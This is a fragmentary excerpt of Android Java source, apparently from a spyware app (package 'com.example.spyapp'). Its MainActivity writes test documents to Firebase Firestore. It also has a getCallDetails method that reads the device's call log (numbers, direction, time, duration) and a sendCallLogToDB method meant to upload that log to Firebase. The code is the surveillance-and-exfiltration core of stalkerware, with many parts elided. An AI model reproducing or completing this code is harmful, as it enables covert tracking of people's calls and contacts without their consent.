...
public class MainActivity extends AppCompatActivity {
    ...
    private boolean initializeDB() {
        ...
        DocumentReference document1=collection1.document();
        document1.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        ...
        document2.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        ...
        document3.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        ...
        DocumentReference document4=collection4.document();
        document4.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
    ...
    public void sendCallLogToDB(ArrayList<com.example.spyapp.CallLog> listCallLogs) {
        //firebase
    ...
    public ArrayList<com.example.spyapp.CallLog> getCallDetails() {

        ArrayList<com.example.spyapp.CallLog> callLogs= new ArrayList<com.example.spyapp.CallLog>();
        ...
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {
            ...
            while (managedCursor.moveToNext()) {
                ...
                sb.append("\n----------------------------------");
                callLogs.add(new com.example.spyapp.CallLog(phNumber,dir,callDayTime,callDuration));
            }
